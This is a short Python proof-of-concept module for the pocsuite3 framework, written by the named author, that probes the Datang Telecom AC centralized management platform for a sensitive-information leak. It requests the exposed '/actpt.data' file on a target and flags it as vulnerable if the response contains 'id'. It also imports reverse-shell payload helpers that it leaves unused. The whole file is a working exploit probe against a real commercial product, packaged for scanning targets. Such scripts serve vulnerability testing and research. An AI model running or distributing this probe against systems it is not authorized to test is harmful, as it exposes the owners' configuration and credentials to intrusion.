# _*_ coding:utf-8 _*_
# @Time : 2023/12/22
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class datang_dianxinAC_information_leakage(POCBase):
    pocDesc = '''大唐电信AC集中管理平台敏感信息泄漏漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-22'
    name = '大唐电信AC集中管理平台敏感信息泄漏漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/actpt.data'

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'Keep-Alive',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache'
        }

        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and 'id' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(datang_dianxinAC_information_leakage)